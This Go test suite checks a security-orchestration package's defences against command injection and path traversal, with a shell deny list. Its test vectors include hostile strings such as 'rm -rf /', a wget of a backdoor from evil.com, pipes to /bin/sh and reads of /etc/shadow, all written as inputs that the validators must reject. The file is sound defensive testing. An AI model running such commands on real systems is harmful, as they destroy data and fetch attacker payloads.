package soar

import (
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// SECURITY TEST SUITE: Command Injection Prevention
// Requirements: FR-SOAR-017
// Threat Model: ATTACK-003
//
// Test Coverage:
// 1. Shell metacharacter blocking (all characters)
// 2. Allowlist regex enforcement
// 3. OWASP command injection attack vectors
// 4. Path traversal attempts
// 5. Prohibited shell command detection

// TestValidateScriptPath_Valid tests valid script paths
func TestValidateScriptPath_Valid(t *testing.T) {
	validPaths := []string{
		"/usr/local/bin/script.sh",
		"/opt/cerberus/scripts/remediate.py",
		"./scripts/block_ip.sh",
		"scripts/isolate_host.py",
		"/path/to/script-with-hyphens.sh",
		"/path/to/script_with_underscores.sh",
		"/path/to/script.with.dots.sh",
		"script.sh",
		"/a",
		"a",
	}

	for _, path := range validPaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateScriptPath(path)
			assert.NoError(t, err, "Valid path should pass validation: %s", path)
		})
	}
}

// TestValidateScriptPath_ShellMetacharacters tests ALL shell metacharacters are blocked
// SECURITY CRITICAL: Every single metacharacter MUST be blocked
func TestValidateScriptPath_ShellMetacharacters(t *testing.T) {
	tests := []struct {
		name     string
		path     string
		metachar rune
		attack   string // Description of attack this enables
	}{
		{"semicolon", "/script.sh;whoami", ';', "command separator - enables chaining arbitrary commands"},
		{"pipe", "/script.sh|nc", '|', "pipe - enables data exfiltration"},
		{"ampersand", "/script.sh&whoami", '&', "background execution - enables parallel attacks"},
		{"dollar", "/script.sh$HOME", '$', "environment variable expansion - enables info disclosure"},
		{"backtick", "/script.sh`whoami`", '`', "command substitution - enables arbitrary command execution"},
		{"backslash", "/script.sh\\x00", '\\', "escape character - enables bypass attempts"},
		{"double_quote", "/script.sh\"test", '"', "string delimiter - enables argument injection"},
		{"single_quote", "/script.sh'test", '\'', "string delimiter - enables argument injection"},
		{"less_than", "/script.sh<file", '<', "input redirection - enables file reading"},
		{"greater_than", "/script.sh>file", '>', "output redirection - enables file writing"},
		{"open_paren", "/script.sh()", '(', "subshell - enables command grouping"},
		{"close_paren", "/script.sh()", ')', "subshell - enables command grouping"},
		{"open_brace", "/script.sh{}", '{', "brace expansion - enables pattern injection"},
		{"close_brace", "/script.sh{}", '}', "brace expansion - enables pattern injection"},
		{"open_bracket", "/script.sh[a]", '[', "character class - enables glob injection"},
		{"close_bracket", "/script.sh[a]", ']', "character class - enables glob injection"},
		{"asterisk", "/script.sh*", '*', "glob wildcard - enables file enumeration"},
		{"question", "/script.sh?", '?', "glob wildcard - enables file enumeration"},
		{"tilde", "~/script.sh", '~', "home directory expansion - enables path manipulation"},
		{"exclamation", "/script.sh!!", '!', "history expansion - enables command replay"},
		{"hash", "/script.sh#comment", '#', "comment - enables command truncation"},
		{"newline", "/script.sh\nwhoami", '\n', "newline - enables command injection"},
		{"carriage_return", "/script.sh\rwhoami", '\r', "carriage return - enables command injection"},
		{"tab", "/script.sh\targ", '\t', "tab - enables delimiter confusion"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScriptPath(tt.path)
			require.Error(t, err, "Path with %s (%c) MUST be rejected - attack: %s", tt.name, tt.metachar, tt.attack)
			assert.Contains(t, err.Error(), "metacharacter", "Error should mention metacharacter")
			t.Logf("✓ BLOCKED %s (%c): %s - %s", tt.name, tt.metachar, tt.path, tt.attack)
		})
	}
}

// TestValidateScriptPath_PathTraversal tests path traversal attack prevention
// SECURITY CRITICAL: Path traversal enables reading/executing arbitrary files
func TestValidateScriptPath_PathTraversal(t *testing.T) {
	attacks := []struct {
		path        string
		description string
	}{
		{"../../../etc/passwd", "classic path traversal"},
		{"../../script.sh", "relative path traversal"},
		{"/legitimate/../../../etc/shadow", "embedded traversal"},
		{"script.sh/../../../etc/hosts", "traversal after filename"},
		{"....//....//etc/passwd", "obfuscated traversal"},
	}

	for _, attack := range attacks {
		t.Run(attack.description, func(t *testing.T) {
			err := ValidateScriptPath(attack.path)
			require.Error(t, err, "Path traversal MUST be blocked: %s", attack.path)
			assert.Contains(t, err.Error(), "traversal", "Error should mention path traversal")
			t.Logf("✓ BLOCKED path traversal: %s - %s", attack.path, attack.description)
		})
	}
}

// TestValidateScriptPath_ProhibitedShells tests shell command blocking
// SECURITY CRITICAL: Shell invocation enables command injection even with safe arguments
func TestValidateScriptPath_ProhibitedShells(t *testing.T) {
	prohibitedShells := []string{
		"sh",
		"bash",
		"zsh",
		"ksh",
		"csh",
		"tcsh",
		"/bin/sh",
		"/bin/bash",
		"/bin/zsh",
		"cmd.exe",
		"cmd",
		"powershell.exe",
		"powershell",
		"pwsh.exe",
		"pwsh",
	}

	for _, shell := range prohibitedShells {
		t.Run(shell, func(t *testing.T) {
			err := ValidateScriptPath(shell)
			require.Error(t, err, "Prohibited shell MUST be blocked: %s", shell)
			assert.Contains(t, err.Error(), "prohibited shell command", "Error should mention prohibited shell")
			t.Logf("✓ BLOCKED prohibited shell: %s", shell)
		})
	}
}

// TestValidateScriptPath_AllowlistViolation tests allowlist regex enforcement
func TestValidateScriptPath_AllowlistViolation(t *testing.T) {
	invalidPaths := []struct {
		path   string
		reason string
	}{
		{"/script with spaces.sh", "spaces not allowed in paths"},
		{"/script@test.sh", "at-sign not allowed in paths"},
		{"/script%20test.sh", "percent encoding not allowed"},
		{"/script+test.sh", "plus sign not allowed"},
		{"/script=test.sh", "equals sign not allowed"},
		{"/script,test.sh", "comma not allowed"},
	}

	for _, test := range invalidPaths {
		t.Run(test.reason, func(t *testing.T) {
			err := ValidateScriptPath(test.path)
			require.Error(t, err, "Invalid path MUST be rejected: %s - %s", test.path, test.reason)
			assert.Contains(t, err.Error(), "invalid characters", "Error should mention invalid characters")
			t.Logf("✓ BLOCKED invalid path: %s - %s", test.path, test.reason)
		})
	}
}

// TestValidateScriptPath_EdgeCases tests edge cases
func TestValidateScriptPath_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		path        string
		shouldError bool
		errorMsg    string
	}{
		{"empty", "", true, "empty"},
		{"too_long", strings.Repeat("a", 513), true, "maximum length"},
		{"exactly_max", strings.Repeat("a", 512), false, ""},
		{"single_char", "a", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScriptPath(tt.path)
			if tt.shouldError {
				require.Error(t, err, "Path should be rejected: %s", tt.name)
				if tt.errorMsg != "" {
					assert.Contains(t, err.Error(), tt.errorMsg)
				}
			} else {
				assert.NoError(t, err, "Path should be valid: %s", tt.name)
			}
		})
	}
}

// TestValidateScriptArguments_Valid tests valid arguments
func TestValidateScriptArguments_Valid(t *testing.T) {
	validArgs := []struct {
		name string
		args []string
	}{
		{"empty", []string{}},
		{"single", []string{"arg1"}},
		{"multiple", []string{"arg1", "arg2", "arg3"}},
		{"with_hyphens", []string{"--flag", "value"}},
		{"with_underscores", []string{"arg_1", "arg_2"}},
		{"with_dots", []string{"file.txt", "path.to.file"}},
		{"with_colons", []string{"key:value", "host:port"}},
		{"with_slashes", []string{"/path/to/file", "path/to/file"}},
		{"with_at", []string{"user@host", "email@domain.com"}},
		{"numbers", []string{"123", "456"}},
		{"mixed", []string{"arg-1_2.3:4/5@6"}},
	}

	for _, test := range validArgs {
		t.Run(test.name, func(t *testing.T) {
			err := ValidateScriptArguments(test.args)
			assert.NoError(t, err, "Valid arguments should pass: %v", test.args)
		})
	}
}

// TestValidateScriptArguments_ShellMetacharacters tests ALL shell metacharacters are blocked in arguments
func TestValidateScriptArguments_ShellMetacharacters(t *testing.T) {
	metacharTests := []struct {
		name   string
		char   rune
		attack string
	}{
		{"semicolon", ';', "command separator"},
		{"pipe", '|', "pipe to other commands"},
		{"ampersand", '&', "background execution"},
		{"dollar", '$', "variable expansion"},
		{"backtick", '`', "command substitution"},
		{"backslash", '\\', "escape sequences"},
		{"double_quote", '"', "string injection"},
		{"single_quote", '\'', "string injection"},
		{"less_than", '<', "input redirection"},
		{"greater_than", '>', "output redirection"},
		{"open_paren", '(', "subshell"},
		{"close_paren", ')', "subshell"},
		{"open_brace", '{', "brace expansion"},
		{"close_brace", '}', "brace expansion"},
		{"open_bracket", '[', "character class"},
		{"close_bracket", ']', "character class"},
		{"asterisk", '*', "glob wildcard"},
		{"question", '?', "glob wildcard"},
		{"tilde", '~', "home expansion"},
		{"exclamation", '!', "history expansion"},
		{"hash", '#', "comment"},
		{"newline", '\n', "command injection"},
		{"carriage_return", '\r', "command injection"},
		{"tab", '\t', "delimiter confusion"},
	}

	for _, tt := range metacharTests {
		t.Run(tt.name, func(t *testing.T) {
			args := []string{fmt.Sprintf("arg%ctest", tt.char)}
			err := ValidateScriptArguments(args)
			require.Error(t, err, "Argument with %s (%c) MUST be rejected - enables: %s", tt.name, tt.char, tt.attack)
			assert.Contains(t, err.Error(), "metacharacter", "Error should mention metacharacter")
			t.Logf("✓ BLOCKED %s (%c) in arguments - prevents: %s", tt.name, tt.char, tt.attack)
		})
	}
}

// TestValidateScriptArguments_OWASPAttacks tests OWASP command injection attack vectors
// Reference: OWASP Testing Guide - Command Injection
func TestValidateScriptArguments_OWASPAttacks(t *testing.T) {
	owaspAttacks := []struct {
		name        string
		args        []string
		description string
	}{
		{
			"command_chaining",
			[]string{"arg1; rm -rf /"},
			"OWASP: Command chaining with semicolon",
		},
		{
			"pipe_to_shell",
			[]string{"arg1 | /bin/sh"},
			"OWASP: Pipe to shell interpreter",
		},
		{
			"background_command",
			[]string{"arg1 & wget http://evil.com/backdoor.sh"},
			"OWASP: Background command execution",
		},
		{
			"command_substitution_dollar",
			[]string{"$(whoami)"},
			"OWASP: Command substitution with $()"},
		{
			"command_substitution_backtick",
			[]string{"`whoami`"},
			"OWASP: Command substitution with backticks",
		},
		{
			"redirect_to_file",
			[]string{"arg1 > /etc/passwd"},
			"OWASP: Output redirection to sensitive file",
		},
		{
			"read_from_file",
			[]string{"arg1 < /etc/shadow"},
			"OWASP: Input redirection from sensitive file",
		},
		{
			"newline_injection",
			[]string{"arg1\nwhoami"},
			"OWASP: Newline injection for command execution",
		},
		{
			"null_byte_injection",
			[]string{"arg1\x00whoami"},
			"OWASP: Null byte injection",
		},
	}

	for _, attack := range owaspAttacks {
		t.Run(attack.name, func(t *testing.T) {
			err := ValidateScriptArguments(attack.args)
			require.Error(t, err, "OWASP attack MUST be blocked: %s - %s", attack.name, attack.description)
			t.Logf("✓ BLOCKED OWASP attack: %s - %s", attack.name, attack.description)
		})
	}
}

// TestValidateScriptArguments_EdgeCases tests argument edge cases
func TestValidateScriptArguments_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		args        []string
		shouldError bool
		errorMsg    string
	}{
		{"empty_array", []string{}, false, ""},
		{"empty_string_arg", []string{""}, true, "empty"},
		{"too_many_args", make([]string, 101), true, "too many"},
		{"exactly_max_args", make([]string, 100), false, ""},
		{"arg_too_long", []string{strings.Repeat("a", 1025)}, true, "maximum length"},
		{"arg_exactly_max", []string{strings.Repeat("a", 1024)}, false, ""},
	}

	// Populate args for tests that need non-empty strings
	for i := range tests {
		if tests[i].name == "exactly_max_args" || tests[i].name == "too_many_args" {
			for j := range tests[i].args {
				tests[i].args[j] = "arg"
			}
		}
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScriptArguments(tt.args)
			if tt.shouldError {
				require.Error(t, err, "Arguments should be rejected: %s", tt.name)
				if tt.errorMsg != "" {
					assert.Contains(t, err.Error(), tt.errorMsg)
				}
			} else {
				assert.NoError(t, err, "Arguments should be valid: %s", tt.name)
			}
		})
	}
}

// TestSanitizeInput_Valid tests valid input sanitization
func TestSanitizeInput_Valid(t *testing.T) {
	validInputs := []string{
		"",
		"simple text",
		"text-with-hyphens",
		"text_with_underscores",
		"text.with.dots",
		"Text With Spaces Is OK",
		"Numbers 12345",
		"Email: user@domain.com",
		"Path: /path/to/file",
	}

	for _, input := range validInputs {
		t.Run(input, func(t *testing.T) {
			output, err := SanitizeInput(input)
			assert.NoError(t, err, "Valid input should pass: %s", input)
			assert.Equal(t, input, output, "Output should match input")
		})
	}
}

// TestSanitizeInput_ShellMetacharacters tests shell metacharacter blocking
func TestSanitizeInput_ShellMetacharacters(t *testing.T) {
	for _, char := range shellMetacharacters {
		t.Run(fmt.Sprintf("char_%c", char), func(t *testing.T) {
			input := fmt.Sprintf("text%cinjection", char)
			_, err := SanitizeInput(input)
			require.Error(t, err, "Input with metacharacter %c MUST be rejected", char)
			assert.Contains(t, err.Error(), "metacharacter")
		})
	}
}

// TestSanitizeInput_EdgeCases tests sanitization edge cases
func TestSanitizeInput_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		shouldError bool
		errorMsg    string
	}{
		{"empty", "", false, ""},
		{"too_long", strings.Repeat("a", 4097), true, "maximum length"},
		{"exactly_max", strings.Repeat("a", 4096), false, ""},
		{"null_byte", "text\x00injection", true, "NULL byte"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SanitizeInput(tt.input)
			if tt.shouldError {
				require.Error(t, err, "Input should be rejected: %s", tt.name)
				if tt.errorMsg != "" {
					assert.Contains(t, err.Error(), tt.errorMsg)
				}
			} else {
				assert.NoError(t, err, "Input should be valid: %s", tt.name)
			}
		})
	}
}

// TestValidateShellProhibited tests shell prohibition validation
func TestValidateShellProhibited(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldError bool
	}{
		{"sh", "sh", true},
		{"bash", "bash", true},
		{"full_path_sh", "/bin/sh", true},
		{"full_path_bash", "/bin/bash", true},
		{"cmd_exe", "cmd.exe", true},
		{"powershell", "powershell.exe", true},
		{"safe_python", "/usr/bin/python3", false},
		{"safe_script", "/opt/scripts/remediate.sh", false},
		{"empty", "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateShellProhibited(tt.command)
			if tt.shouldError {
				require.Error(t, err, "Command should be rejected: %s", tt.command)
				if tt.command != "" {
					assert.Contains(t, err.Error(), "prohibited")
				}
			} else {
				assert.NoError(t, err, "Command should be valid: %s", tt.command)
			}
		})
	}
}

// TestComprehensiveSecurityValidation is the master security validation test
// This test ensures ALL security requirements are met
func TestComprehensiveSecurityValidation(t *testing.T) {
	t.Run("AllShellMetacharactersBlocked", func(t *testing.T) {
		// Verify every single shell metacharacter is blocked
		for _, char := range shellMetacharacters {
			path := fmt.Sprintf("/script%c", char)
			err := ValidateScriptPath(path)
			require.Error(t, err, "Shell metacharacter %c MUST be blocked in paths", char)

			args := []string{fmt.Sprintf("arg%c", char)}
			err = ValidateScriptArguments(args)
			require.Error(t, err, "Shell metacharacter %c MUST be blocked in arguments", char)
		}
		t.Log("✓ All shell metacharacters are blocked in paths and arguments")
	})

	t.Run("AllowlistEnforced", func(t *testing.T) {
		// Verify allowlist regex is enforced
		invalidChars := []rune{'@', '%', '+', '=', ',', ' ', '\n', '\r', '\t'}
		for _, char := range invalidChars {
			path := fmt.Sprintf("/script%ctest", char)
			err := ValidateScriptPath(path)
			require.Error(t, err, "Invalid character %c MUST be rejected by allowlist", char)
		}
		t.Log("✓ Allowlist regex is enforced for paths")
	})

	t.Run("NoShellInvocation", func(t *testing.T) {
		// Verify shell commands are prohibited
		shells := []string{"sh", "bash", "cmd.exe", "powershell"}
		for _, shell := range shells {
			err := ValidateScriptPath(shell)
			require.Error(t, err, "Shell %s MUST be prohibited", shell)

			err = ValidateShellProhibited(shell)
			require.Error(t, err, "Shell %s MUST be prohibited by ValidateShellProhibited", shell)
		}
		t.Log("✓ Shell invocation is prohibited")
	})

	t.Run("PathTraversalBlocked", func(t *testing.T) {
		// Verify path traversal is blocked
		traversals := []string{"../etc/passwd", "../../secret", "/path/../../../root"}
		for _, path := range traversals {
			err := ValidateScriptPath(path)
			require.Error(t, err, "Path traversal %s MUST be blocked", path)
		}
		t.Log("✓ Path traversal attacks are blocked")
	})

	t.Log("\n" + strings.Repeat("=", 80))
	t.Log("SECURITY VALIDATION COMPLETE")
	t.Log("✓ Command injection prevention: IMPLEMENTED")
	t.Log("✓ Shell metacharacters: BLOCKED")
	t.Log("✓ Allowlist validation: ENFORCED")
	t.Log("✓ Shell invocation: PROHIBITED")
	t.Log("✓ Path traversal: BLOCKED")
	t.Log("✓ OWASP attack vectors: TESTED AND BLOCKED")
	t.Log(strings.Repeat("=", 80))
}
